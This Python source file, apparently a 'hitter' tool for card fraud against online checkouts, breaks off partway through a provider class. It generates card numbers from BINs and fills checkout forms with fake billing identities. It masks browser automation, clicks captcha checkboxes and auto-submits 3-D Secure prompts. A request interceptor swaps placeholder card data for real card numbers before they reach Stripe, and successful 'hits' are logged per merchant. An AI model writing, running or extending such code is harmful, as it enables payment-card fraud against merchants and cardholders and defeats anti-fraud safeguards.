#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NACHT HITTER — Engine v4
Reference: original DLX Hitter autofill classes, extended with:
 - Per-provider autofill classes (exact masked values + intercept)
 - iframe-aware find_and_fill_field (all frames searched)
 - JS submit fallback
 - Screenshot after submit
 - Custom email/name injection
 - Corrected success detection (no false positives on checkout.stripe.com)
 - CardPatternLearner, RateLimiter
"""

import re
import json
import os
import time
import random
import sqlite3
import asyncio
import requests
import urllib3
from collections import defaultdict
from datetime import datetime
from typing import Callable, Dict, List, Optional, Awaitable
from playwright.async_api import async_playwright, Page, Route, Request

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Config ────────────────────────────────────────────────────────────────────
DATABASE       = "nacht_hitter.db"
MAX_ATTEMPTS   = 100
MAX_CONCURRENT = 3
SCREENSHOT_DIR = "nacht_screenshots"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
]

# ── Address pool (rotated per hit) ───────────────────────────────────────────
ADDRESS_POOL = [
    # US addresses
    {"first_name":"James","last_name":"Wilson","name":"James Wilson",
     "address":"742 Evergreen Terrace","city":"Springfield","state":"IL",
     "zip":"62701","country":"US","country_name":"United States","phone":"2175550142"},
    {"first_name":"Emily","last_name":"Johnson","name":"Emily Johnson",
     "address":"1600 Pennsylvania Ave NW","city":"Washington","state":"DC",
     "zip":"20500","country":"US","country_name":"United States","phone":"2025550100"},
    {"first_name":"Michael","last_name":"Brown","name":"Michael Brown",
     "address":"350 Fifth Avenue","city":"New York","state":"NY",
     "zip":"10118","country":"US","country_name":"United States","phone":"2125550199"},
    {"first_name":"Sarah","last_name":"Davis","name":"Sarah Davis",
     "address":"1 Infinite Loop","city":"Cupertino","state":"CA",
     "zip":"95014","country":"US","country_name":"United States","phone":"4085550100"},
    {"first_name":"Robert","last_name":"Martinez","name":"Robert Martinez",
     "address":"233 S Wacker Dr","city":"Chicago","state":"IL",
     "zip":"60606","country":"US","country_name":"United States","phone":"3125550123"},
    # UK addresses
    {"first_name":"Oliver","last_name":"Smith","name":"Oliver Smith",
     "address":"10 Downing Street","city":"London","state":"England",
     "zip":"SW1A 2AA","country":"GB","country_name":"United Kingdom","phone":"02071234567"},
    {"first_name":"Charlotte","last_name":"Jones","name":"Charlotte Jones",
     "address":"221B Baker Street","city":"London","state":"England",
     "zip":"NW1 6XE","country":"GB","country_name":"United Kingdom","phone":"02079461234"},
    # Canada
    {"first_name":"Liam","last_name":"Taylor","name":"Liam Taylor",
     "address":"1 Sussex Drive","city":"Ottawa","state":"ON",
     "zip":"K1M 1M4","country":"CA","country_name":"Canada","phone":"6135550100"},
    {"first_name":"Emma","last_name":"Anderson","name":"Emma Anderson",
     "address":"100 Queen St W","city":"Toronto","state":"ON",
     "zip":"M5H 2N1","country":"CA","country_name":"Canada","phone":"4165550100"},
    # Australia
    {"first_name":"Noah","last_name":"Thomas","name":"Noah Thomas",
     "address":"1 Martin Place","city":"Sydney","state":"NSW",
     "zip":"2000","country":"AU","country_name":"Australia","phone":"0290001234"},
    # Germany
    {"first_name":"Leon","last_name":"Müller","name":"Leon Müller",
     "address":"Unter den Linden 1","city":"Berlin","state":"Berlin",
     "zip":"10117","country":"DE","country_name":"Germany","phone":"03020001234"},
    # France
    {"first_name":"Hugo","last_name":"Dupont","name":"Hugo Dupont",
     "address":"5 Avenue Anatole France","city":"Paris","state":"Île-de-France",
     "zip":"75007","country":"FR","country_name":"France","phone":"0140001234"},
]

def get_random_billing() -> Dict:
    return random.choice(ADDRESS_POOL).copy()

DEFAULT_BILLING = ADDRESS_POOL[0].copy()
DEFAULT_BILLING["email"] = "test@gmail.com"

os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# ── Provider Detection ────────────────────────────────────────────────────────
def detect_provider(url: str, html: str = "") -> str:
    u = url.lower()
    if "stripe.com" in u:                            return "stripe"
    if "checkout.com" in u:                          return "checkoutcom"
    if "shopify.com" in u or "myshopify.com" in u:   return "shopify"
    if "paypal.com" in u:                            return "paypal"
    if "braintree" in u or "braintreegateway" in u:  return "braintree"
    if "adyen.com" in u or "adyen" in u:             return "adyen"
    if "squareup.com" in u or "square" in u:         return "square"
    if "mollie.com" in u:                            return "mollie"
    if "klarna.com" in u:                            return "klarna"
    if "authorize.net" in u or "authorizenet" in u:  return "authorizenet"
    if html:
        h = html.lower()
        if "woocommerce" in h:                        return "woocommerce"
        if "bigcommerce" in h:                        return "bigcommerce"
        if "window.shopify" in h or "shopify.com/s/files" in h: return "shopify"
        if "stripe.com/v3" in h or "js.stripe.com" in h:        return "stripe"
        if "braintree" in h:                          return "braintree"
        if "adyen" in h:                              return "adyen"
        if "paypal" in h:                             return "paypal"
        if "mollie" in h:                             return "mollie"
        if "klarna" in h:                             return "klarna"
        if "authorize.net" in h:                      return "authorizenet"
        if "square" in h:                             return "square"
        if "wix.com" in h:                            return "wix"
        if "ecwid" in h:                              return "ecwid"
        if "checkout.com" in h or "frames" in h:      return "checkoutcom"
    return "unknown"

# ── Database ──────────────────────────────────────────────────────────────────
def init_db(db_path: str = DATABASE):
    conn = sqlite3.connect(db_path)
    conn.execute("""CREATE TABLE IF NOT EXISTS hits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT, user_id INTEGER, card TEXT,
        merchant TEXT, product TEXT, amount TEXT,
        success INTEGER, decline_code TEXT,
        receipt_url TEXT, response_time REAL,
        screenshot_path TEXT
    )""")
    conn.commit()
    conn.close()

# ── CardPatternLearner ────────────────────────────────────────────────────────
class CardPatternLearner:
    def __init__(self):
        self.patterns: Dict[str, Dict[str, Dict]] = defaultdict(
            lambda: defaultdict(lambda: {"s": 0, "f": 0})
        )

    def learn(self, card: Dict, merchant: str, success: bool):
        k = "s" if success else "f"
        self.patterns[merchant][card["card"][:6]][k] += 1

    def suggest(self, merchant: str) -> Optional[str]:
        best, best_rate = None, -1.0
        for bin6, d in self.patterns.get(merchant, {}).items():
            total = d["s"] + d["f"]
            if total >= 2:
                rate = d["s"] / total
                if rate > best_rate:
                    best_rate, best = rate, bin6
        return best

# ── URL Analyzer ──────────────────────────────────────────────────────────────
CURRENCY_SYMBOL = {"$": "USD", "€": "EUR", "£": "GBP", "₹": "INR",
                   "¥": "JPY", "R$": "BRL", "C$": "CAD", "A$": "AUD"}
SYMBOL_OF = {v: k for k, v in CURRENCY_SYMBOL.items()}

class URLAnalyzer:
    @staticmethod
    def _from_scripts(html: str) -> Dict:
        out = {"amount": None, "product": None, "merchant": None,
               "product_url": None, "currency": None}
        for script in re.findall(r"<script[^>]*>(.*?)</script>", html, re.DOTALL):
            for pat, kind in [
                (r'window\.__STRIPE__\s*=\s*({.*?});',         "obj"),
                (r'window\.__INITIAL_STATE__\s*=\s*({.*?});',  "obj"),
                (r'var\s+stripePaymentData\s*=\s*({.*?});',    "obj"),
                (r'"paymentIntent"\s*:\s*({[^{}]{0,3000}})',   "obj"),
                (r'"amount"\s*:\s*(\d+)',                       "amount"),
                (r'"currency"\s*:\s*"([A-Za-z]{2,5})"',        "currency"),
                (r'"name"\s*:\s*"([^"]{1,120})"',              "name"),
                (r'"business_name"\s*:\s*"([^"]+)"',           "business"),
                (r'"display_name"\s*:\s*"([^"]+)"',            "display"),
                (r'"product_url"\s*:\s*"([^"]+)"',             "product_url"),
            ]:
                m = re.search(pat, script, re.DOTALL)
                if not m:
                    continue
                try:
                    if kind == "obj":
                        def _w(o):
                            if isinstance(o, dict):
                                if isinstance(o.get("amount"), (int, float)):
                                    out["amount"] = o["amount"]
                                if isinstance(o.get("currency"), str) and len(o["currency"]) <= 5:
                                    out["currency"] = o["currency"].upper()
                                if isinstance(o.get("name"), str) and len(o["name"]) > 1:
                                    out["product"] = o["name"]
                                if isinstance(o.get("business_name"), str):
                                    out["merchant"] = o["business_name"]
                                if isinstance(o.get("display_name"), str):
                                    out["merchant"] = out["merchant"] or o["display_name"]
                                if isinstance(o.get("product_url"), str):
                                    out["product_url"] = o["product_url"]
                                for v in o.values():
                                    _w(v)
                            elif isinstance(o, list):
                                for i in o:
                                    _w(i)
                        _w(json.loads(m.group(1)))
                    elif kind == "amount" and out["amount"] is None:
                        out["amount"] = int(m.group(1))
                    elif kind == "currency" and out["currency"] is None:
                        out["currency"] = m.group(1).upper()
                    elif kind == "name" and out["product"] is None:
                        out["product"] = m.group(1)
                    elif kind == "business":
                        out["merchant"] = m.group(1)
                    elif kind == "display":
                        out["merchant"] = out["merchant"] or m.group(1)
                    elif kind == "product_url":
                        out["product_url"] = m.group(1)
                except Exception:
                    pass
        return out

    @staticmethod
    def _fmt(raw, currency: str = "USD") -> str:
        sym = SYMBOL_OF.get(currency.upper(), currency.upper() + " ")
        no_cent = currency.upper() in ("JPY", "KRW", "CLP", "VND", "IDR")
        try:
            v = float(str(raw).replace(",", ""))
        except Exception:
            return f"{sym}{raw}"
        if not no_cent and v > 100:
            v /= 100
        return f"{sym}{v:.2f}" if not no_cent else f"{sym}{int(v)}"

    @staticmethod
    def extract_currency(html: str) -> str:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("currency"):
            return sd["currency"]
        for pat in [r'"currency"\s*:\s*"([A-Z]{3})"', r'data-currency="([A-Z]{3})"',
                    r'currency["\s:=]+([A-Z]{3})\b']:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                return m.group(1).upper()
        for sym, code in CURRENCY_SYMBOL.items():
            if sym in html[:5000]:
                return code
        return "USD"

    @staticmethod
    def extract_amount(html: str, currency: str = "USD") -> Optional[str]:
        sd = URLAnalyzer._from_scripts(html)
        cur = sd.get("currency") or currency
        if sd.get("amount") is not None:
            return URLAnalyzer._fmt(sd["amount"], cur)
        for pat in [
            r'"amount_display"\s*:\s*"([^"]+)"',
            r'"formatted_amount"\s*:\s*"([^"]+)"',
            r'data-amount="(\d+)"',
            r'"amount_subtotal"\s*:\s*(\d+)',
            r'"total"\s*:\s*(\d+)',
            r'"amount"\s*:\s*(\d+)',
            r'([\$€£₹])\s*([\d,]+\.?\d*)',
            r'Total[:\s]+[\$€£₹]?\s*([\d,]+\.?\d*)',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                if m.lastindex == 2:
                    sym, num = m.group(1), m.group(2).replace(",", "")
                    return URLAnalyzer._fmt(float(num), CURRENCY_SYMBOL.get(sym, cur))
                val = m.group(1).strip().replace(",", "")
                if re.match(r"^[\d]+\.?\d*$", val):
                    return URLAnalyzer._fmt(float(val), cur)
        return None

    @staticmethod
    def extract_product_name(html: str) -> Optional[str]:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("product"):
            return sd["product"]
        for pat in [
            r'<meta property="og:title" content="([^"]+)"',
            r'"name"\s*:\s*"([^"]{3,120})"',
            r"<h1[^>]*>([^<]{3,120})</h1>",
            r"<title>([^<]{3,120})</title>",
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                name = re.sub(r'<[^>]+>', '', m.group(1)).strip()
                name = re.sub(r'\s*[|–\-]\s*(Stripe|Checkout|Shopify|Pay).*$',
                               '', name, flags=re.IGNORECASE)
                if name and len(name) > 2:
                    return name[:120]
        return None

    @staticmethod
    def extract_merchant(html: str) -> str:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("merchant"):
            return sd["merchant"]
        for pat in [
            r'"business_name"\s*:\s*"([^"]+)"',
            r'"display_name"\s*:\s*"([^"]+)"',
            r'<meta property="og:site_name" content="([^"]+)"',
            r'<title>([^<]+?)\s*[|–\-]\s*(?:Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|WooCommerce)',
        ]:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                return m.group(1).strip()
        return "Unknown"

    @staticmethod
    def extract_product_url(html: str) -> Optional[str]:
        sd = URLAnalyzer._from_scripts(html)
        if sd.get("product_url"):
            return sd["product_url"]
        for pat in [r'<meta property="og:url" content="([^"]+)"',
                    r'<link rel="canonical" href="([^"]+)"']:
            m = re.search(pat, html, re.IGNORECASE)
            if m and m.group(1).startswith("http"):
                return m.group(1).strip()
        return None

    @staticmethod
    async def analyze(url: str, use_playwright: bool = False) -> Dict:
        result: Dict = {
            "url": url, "merchant": "Unknown", "product": "Unknown",
            "product_url": None, "amount": None, "currency": "USD",
            "success": False, "error": None,
        }
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS),
                       "Accept-Language": "en-US,en;q=0.9"}
            r = requests.get(url, timeout=15, verify=False,
                             headers=headers, allow_redirects=True)
            if r.status_code == 200:
                html = r.text
                currency = URLAnalyzer.extract_currency(html)
                result.update({
                    "merchant":    URLAnalyzer.extract_merchant(html),
                    "product":     URLAnalyzer.extract_product_name(html) or "Unknown",
                    "product_url": URLAnalyzer.extract_product_url(html),
                    "amount":      URLAnalyzer.extract_amount(html, currency),
                    "currency":    currency,
                    "success":     True,
                })
            else:
                result["error"] = f"HTTP {r.status_code}"
        except Exception as e:
            result["error"] = str(e)

        if use_playwright and (result["merchant"] == "Unknown" or
                result["product"] in ("Unknown", "Stripe Checkout", "Checkout")):
            deep = await URLAnalyzer._pw_analyze(url)
            if deep.get("success"):
                if deep["merchant"] != "Unknown":   result["merchant"]    = deep["merchant"]
                if deep.get("product") not in ("Unknown", None): result["product"] = deep["product"]
                if deep.get("product_url"):          result["product_url"] = deep["product_url"]
                if deep.get("amount"):               result["amount"]      = deep["amount"]
                if deep.get("currency", "USD") != "USD": result["currency"] = deep["currency"]
        return result

    @staticmethod
    async def _pw_analyze(url: str) -> Dict:
        out: Dict = {"merchant": "Unknown", "product": "Unknown",
                     "product_url": None, "amount": None, "currency": "USD", "success": False}
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True,
                    args=["--disable-blink-features=AutomationControlled", "--no-sandbox"])
                ctx  = await browser.new_context(ignore_https_errors=True)
                page = await ctx.new_page()
                await page.goto(url, timeout=60000, wait_until="domcontentloaded")
                await asyncio.sleep(3)
                merchant = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:site_name"]');
                    if (m) return m.content;
                    const t = document.title;
                    const x = t.match(/(.+?)\s*[|\u2013\-]\s*(Stripe|Checkout|Shopify|PayPal)/);
                    return x ? x[1] : t;
                }""")
                if merchant and merchant not in ("Stripe Checkout","Checkout","Shopify Checkout","PayPal"):
                    out["merchant"] = merchant.strip()
                product = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:title"]');
                    if (m) return m.content;
                    const h = document.querySelector('h1');
                    return h ? h.innerText.trim() : document.title;
                }""")
                if product and product not in ("Stripe Checkout","Checkout","Shopify Checkout"):
                    out["product"] = product.strip()[:120]
                product_url = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:url"]');
                    if (m) return m.content;
                    const l = document.querySelector('link[rel="canonical"]');
                    return l ? l.href : null;
                }""")
                if product_url:
                    out["product_url"] = product_url
                amount_raw = await page.evaluate(r"""() => {
                    for (const s of ['[data-amount]','.amount','.price','.total',
                                     '[class*="amount"]','[class*="price"]','[class*="total"]']) {
                        const el = document.querySelector(s);
                        if (el) { const t=(el.innerText||el.getAttribute('data-amount')||'').trim(); if(t) return t; }
                    }
                    return null;
                }""")
                if amount_raw:
                    am = re.search(r'([€$£₹¥])\s*([\d,]+\.?\d*)', amount_raw)
                    if am:
                        sym, num = am.group(1), am.group(2).replace(",","")
                        out["amount"]   = f"{sym}{num}"
                        out["currency"] = CURRENCY_SYMBOL.get(sym, "USD")
                    else:
                        nm = re.search(r'[\d,]+\.?\d*', amount_raw)
                        if nm:
                            out["amount"] = f"${nm.group(0).replace(',','')}"
                currency_raw = await page.evaluate(r"""() => {
                    const m = document.querySelector('meta[property="og:price:currency"]');
                    if (m) return m.content;
                    const el = document.querySelector('[data-currency]');
                    return el ? el.getAttribute('data-currency') : null;
                }""")
                if currency_raw:
                    out["currency"] = currency_raw.upper()
                out["success"] = True
                await browser.close()
        except Exception as e:
            out["error"] = str(e)
        return out

# ── Card Generator ────────────────────────────────────────────────────────────
class CardGenerator:
    @staticmethod
    def brand(num: str) -> str:
        n = re.sub(r"\D", "", num)[:6]
        if re.match(r"^3[47]", n):                              return "amex"
        if re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n): return "mastercard"
        if re.match(r"^4", n):                                  return "visa"
        if re.match(r"^6(?:011|5)", n):                         return "discover"
        return "unknown"

    @staticmethod
    def _luhn_ok(num: str) -> bool:
        d = [int(x) for x in num]
        return (sum(d[-1::-2]) + sum(sum(divmod(x*2,10)) for x in d[-2::-2])) % 10 == 0

    @staticmethod
    def generate(bin_str: str) -> Optional[Dict]:
        if not bin_str or len(bin_str) < 4:
            return None
        parts = bin_str.split("|")
        raw   = re.sub(r"[^0-9xX]", "", parts[0])
        test  = raw.replace("x","0").replace("X","0")
        b     = CardGenerator.brand(test)
        tlen  = 15 if b == "amex" else 16
        cvvl  = 4  if b == "amex" else 3

        card = "".join(str(random.randint(0,9)) if c.lower()=="x" else c for c in raw)
        card += "".join(str(random.randint(0,9)) for _ in range(tlen-len(card)-1))
        check = next((i for i in range(10) if CardGenerator._luhn_ok(card+str(i))), 0)
        full  = card + str(check)

        yr_now = datetime.now().year % 100
        month  = f"{random.randint(1,12):02d}"
        year   = f"{yr_now + random.randint(1,5):02d}"
        cvv    = "".join(str(random.randint(0,9)) for _ in range(cvvl))

        if len(parts) > 1 and parts[1] and parts[1].lower() != "xx":
            month = parts[1].zfill(2)
        if len(parts) > 2 and parts[2] and parts[2].lower() != "xx":
            year  = parts[2].zfill(2)
        if len(parts) > 3 and parts[3] and parts[3].lower() not in ("xxx","xxxx"):
            cvv   = parts[3].zfill(cvvl)

        return {"card": full, "month": month, "year": year, "cvv": cvv, "brand": b}

    @staticmethod
    def generate_many(bin_str: str, count: int) -> List[Dict]:
        return [c for _ in range(count) if (c := CardGenerator.generate(bin_str))]

    @staticmethod
    def parse(s: str) -> Optional[Dict]:
        p = s.strip().split("|")
        if len(p) == 4:
            return {"card": p[0].strip(), "month": p[1].strip().zfill(2),
                    "year": p[2].strip().zfill(2), "cvv": p[3].strip(),
                    "brand": CardGenerator.brand(p[0].strip())}
        return None

# ── Fingerprint ───────────────────────────────────────────────────────────────
class Fingerprint:
    @staticmethod
    def generate() -> Dict:
        return {"user_agent":  random.choice(USER_AGENTS),
                "viewport":    {"width": 1920, "height": 1080},
                "locale":      "en-US",
                "timezone_id": "America/New_York"}

    STEALTH = """
        Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
        window.chrome={runtime:{}};
        Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
        Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});
    """

# ── Rate Limiter ──────────────────────────────────────────────────────────────
class RateLimiter:
    def __init__(self):
        self.delay    = 1.0
        self.failures = 0

    def next(self, success: bool) -> float:
        if success:
            self.failures = 0
            self.delay    = max(0.5, self.delay * 0.85)
        else:
            self.failures += 1
            self.delay     = min(8.0, self.delay * 1.3 + self.failures * 0.3)
        return max(0.5, min(10.0, self.delay))

# ── Base Autofill (iframe-aware) ──────────────────────────────────────────────
class BaseAutofill:
    CARD_SELECTORS:   List[str] = []
    EXPIRY_SELECTORS: List[str] = []
    CVC_SELECTORS:    List[str] = []
    NAME_SELECTORS:   List[str] = []
    EMAIL_SELECTORS:  List[str] = []
    SUBMIT_SELECTORS: List[str] = []
    MASKED_CARD   = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "123"

    def __init__(self, page: Page, email: str = None, name: str = None,
                 billing: Dict = None):
        self.page     = page
        self.real_card: Optional[Dict] = None
        self.billing  = billing or get_random_billing()
        self.email    = email or self.billing.get("email", "test@gmail.com")
        self.name_val = name  or self.billing.get("name", "John Smith")

    async def find_and_fill_field(self, selectors: List[str], value: str) -> bool:
        """Try on main page first, then all child iframes."""
        for sel in selectors:
            try:
                el = await self.page.query_selector(sel)
                if el and await el.is_visible():
                    await el.click()
                    await el.fill(value)
                    return True
            except Exception:
                pass
        for frame in self.page.frames:
            if frame == self.page.main_frame:
                continue
            for sel in selectors:
                try:
                    el = await frame.query_selector(sel)
                    if el and await el.is_visible():
                        await el.click()
                        await el.fill(value)
                        return True
                except Exception:
                    pass
        return False

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS,   self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS,    self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS,   self.name_val)
        await self.find_and_fill_field(self.EMAIL_SELECTORS,  self.email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible() and await btn.is_enabled():
                    await btn.click()
                    return True
            except Exception:
                pass
        # JS fallback
        try:
            done = await self.page.evaluate("""() => {
                const b = [...document.querySelectorAll(
                    'button[type="submit"],input[type="submit"],button')
                ].find(e => e.offsetParent !== null && !e.disabled);
                if (b) { b.click(); return true; }
                const f = document.querySelector('form');
                if (f) { f.submit(); return true; }
                return false;
            }""")
            return bool(done)
        except Exception:
            return False

    async def detect_3ds(self) -> bool:
        for frame in self.page.frames:
            u = (frame.url or "").lower()
            if any(k in u for k in ("3ds","challenge","acs","secure","authenticate",
                                     "cardinal","songbird","centinel")):
                return True
        try:
            body = (await self.page.text_content("body") or "").lower()
            if any(k in body for k in ("3d secure","3ds","authentication required",
                                        "verify your card","enter the otp",
                                        "one-time password","verification code",
                                        "secure code","enter code","sms code")):
                return True
        except Exception:
            pass
        return False

    async def wait_for_3ds(self, timeout: int = 10000) -> bool:
        start = time.time()
        while (time.time() - start) * 1000 < timeout:
            if await self.detect_3ds():
                return True
            await asyncio.sleep(0.5)
        return False

    async def auto_complete_3ds(self) -> bool:
        if not await self.detect_3ds():
            return False
        btn_sels = [
            'button[type="submit"]', 'input[type="submit"]',
            'button:has-text("Continue")', 'button:has-text("Submit")',
            'button:has-text("Confirm")', 'button:has-text("Proceed")',
            '#proceed-button', '.btn-primary', '#btnSubmit',
        ]
        for sel in btn_sels:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    await asyncio.sleep(3)
                    return True
            except Exception:
                pass
        for frame in self.page.frames:
            if frame == self.page.main_frame:
                continue
            for sel in btn_sels:
                try:
                    btn = await frame.query_selector(sel)
                    if btn and await btn.is_visible():
                        await btn.click()
                        await asyncio.sleep(3)
                        return True
                except Exception:
                    pass
            try:
                ok = await frame.evaluate(
                    "()=>{const f=document.querySelector('form');if(f){f.submit();return true;}return false;}")
                if ok:
                    await asyncio.sleep(3)
                    return True
            except Exception:
                pass
        return False

    async def handle_captcha(self):
        try:
            fl = self.page.frame_locator('iframe[src*="hcaptcha.com"]')
            cb = fl.locator("#checkbox").first
            if await cb.is_visible(timeout=2000):
                await cb.click()
                await asyncio.sleep(2)
        except Exception:
            pass

    async def fill_billing(self):
        b = self.billing
        mapping = [
            (["#billing_first_name","input[name='billing_first_name']","input[name='firstName']",
              "input[placeholder*='First name']","input[placeholder*='First Name']"],
             b.get("first_name","John")),
            (["#billing_last_name","input[name='billing_last_name']","input[name='lastName']",
              "input[placeholder*='Last name']","input[placeholder*='Last Name']"],
             b.get("last_name","Smith")),
            (["#billing_address_1","input[name='billing_address_1']","input[name='address']",
              "input[name='address1']","input[placeholder*='Address']",
              "input[autocomplete='street-address']"],
             b.get("address","123 Main Street")),
            (["#billing_city","input[name='billing_city']","input[name='city']",
              "input[placeholder*='City']","input[autocomplete='address-level2']"],
             b.get("city","New York")),
            (["#billing_postcode","input[name='billing_postcode']","input[name='zip']",
              "input[name='postal_code']","input[placeholder*='ZIP']","input[placeholder*='Postal']",
              "input[autocomplete='postal-code']"],
             b.get("zip","10001")),
            (["#billing_phone","input[name='billing_phone']","input[name='phone']","input[type='tel']"],
             b.get("phone","2125551234")),
        ]
        for sels, val in mapping:
            await self.find_and_fill_field(sels, val)

        country_code = b.get("country", "US")
        country_name = b.get("country_name", "United States")

        # 1. Native <select> dropdown (WooCommerce, BigCommerce, etc.)
        for sel in ["#billing_country","select[name='billing_country']",
                    "select[name='country']","select[autocomplete='country']",
                    "select[id*='country']"]:
            try:
                el = await self.page.query_selector(sel)
                if el and await el.is_visible():
                    await el.select_option(value=country_code)
                    break
            except Exception:
                pass

        # 2. Stripe Link / Stripe Checkout React country combobox
        # Stripe renders country as a custom <select> or a combobox inside its iframe
        # Try to find it in all frames and set via JS property assignment
        await self._set_stripe_country(country_code)

        # 3. State/province native select
        state_val = b.get("state", "NY")
        for sel in ["#billing_state","select[name='billing_state']",
                    "select[name='state']","select[id*='state']"]:
            try:
                el = await self.page.query_selector(sel)
                if el and await el.is_visible():
                    try:
                        await el.select_option(value=state_val)
                    except Exception:
                        await el.select_option(label=state_val)
                    break
            except Exception:
                pass

    async def _set_stripe_country(self, country_code: str):
        """Handle Stripe Checkout's React-rendered country/region dropdown."""
        # Stripe's country selector is a <select> inside their iframe but
        # the React controlled value needs a native input event to update.
        js_set = f"""
        (code) => {{
            // Try every select that looks like country
            const sels = document.querySelectorAll(
                'select[name="country"], select[id*="country"], select[autocomplete="country"], select[aria-label*="ountry"]'
            );
            for (const s of sels) {{
                const opt = [...s.options].find(o => o.value === code || o.value.startsWith(code));
                if (opt) {{
                    const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLSelectElement.prototype, 'value').set;
                    nativeInputValueSetter.call(s, opt.value);
                    s.dispatchEvent(new Event('change', {{ bubbles: true }}));
                    s.dispatchEvent(new Event('input',  {{ bubbles: true }}));
                    return true;
                }}
            }}
            return false;
        }}
        """
        try:
            done = await self.page.evaluate(js_set, country_code)
            if done:
                return
        except Exception:
            pass
        # Try same JS in every child frame (Stripe Elements frame)
        for frame in self.page.frames:
            if frame == self.page.main_frame:
                continue
            try:
                done = await frame.evaluate(js_set, country_code)
                if done:
                    return
            except Exception:
                pass

# ── Stripe Autofill ───────────────────────────────────────────────────────────
class StripeAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#cardNumber', '[name="cardNumber"]', '[autocomplete="cc-number"]',
        '[data-elements-stable-field-name="cardNumber"]',
        'input[placeholder*="Card number"]', 'input[placeholder*="card number"]',
        'input[aria-label*="Card number"]', '[class*="CardNumberInput"] input',
        'input[name="number"]', 'input[id*="card-number"]',
        'input[placeholder*="1234 1234"]',
    ]
    EXPIRY_SELECTORS = [
        '#cardExpiry', '[name="cardExpiry"]', '[autocomplete="cc-exp"]',
        '[data-elements-stable-field-name="cardExpiry"]',
        'input[placeholder*="MM / YY"]', 'input[placeholder*="MM/YY"]',
        'input[placeholder*="MM"]', '[class*="CardExpiry"] input',
    ]
    CVC_SELECTORS = [
        '#cardCvc', '[name="cardCvc"]', '[autocomplete="cc-csc"]',
        '[data-elements-stable-field-name="cardCvc"]',
        'input[placeholder*="CVC"]', 'input[placeholder*="CVV"]',
        '[class*="CardCvc"] input', 'input[name="cvc"]',
    ]
    NAME_SELECTORS  = ['#billingName', '[name="billingName"]', '[autocomplete="cc-name"]',
                       'input[placeholder*="Name on card"]', 'input[name="name"]']
    EMAIL_SELECTORS = ['input[type="email"]', 'input[name*="email"]',
                       'input[autocomplete="email"]', 'input[placeholder*="email"]',
                       'input[placeholder*="Email"]']
    SUBMIT_SELECTORS= ['.SubmitButton', '[class*="SubmitButton"]', 'button[type="submit"]',
                       '[data-testid*="submit"]', 'button:has-text("Pay")',
                       'button:has-text("Subscribe")', 'button:has-text("Donate")']
    MASKED_CARD   = "0000000000000000"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "000"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and "stripe.com" in request.url:
                pd = request.post_data or ""
                c  = self.real_card
                if c:
                    pd = pd.replace("card[number]=0000000000000000", f"card[number]={c['card']}")
                    pd = pd.replace("card[exp_month]=01",            f"card[exp_month]={c['month']}")
                    pd = pd.replace("card[exp_year]=30",             f"card[exp_year]={c['year']}")
                    pd = pd.replace("card[cvc]=000",                 f"card[cvc]={c['cvv']}")
                    pd = pd.replace("card[expiry]=01/30",            f"card[expiry]={c['month']}/{c['year']}")
                    # JSON paths
                    pd = re.sub(r'"number"\s*:\s*"[^"]*"',   f'"number":"{c["card"]}"',          pd)
                    pd = re.sub(r'"exp_month"\s*:\s*\d+',     f'"exp_month":{int(c["month"])}',   pd)
                    pd = re.sub(r'"exp_year"\s*:\s*\d+',      f'"exp_year":20{c["year"]}',        pd)
                    pd = re.sub(r'"cvc"\s*:\s*"[^"]*"',       f'"cvc":"{c["cvv"]}"',              pd)
                    await route.continue_(post_data=pd); return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

# ── CheckoutCom ───────────────────────────────────────────────────────────────
class CheckoutComAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[data-frames="card-number"]', '#card-number', 'input[name="cardNumber"]',
        'input[placeholder*="Card number"]', 'input[aria-label*="Card number"]',
        '[data-testid="card-number"]', '#payment-card-number',
    ]
    EXPIRY_SELECTORS = [
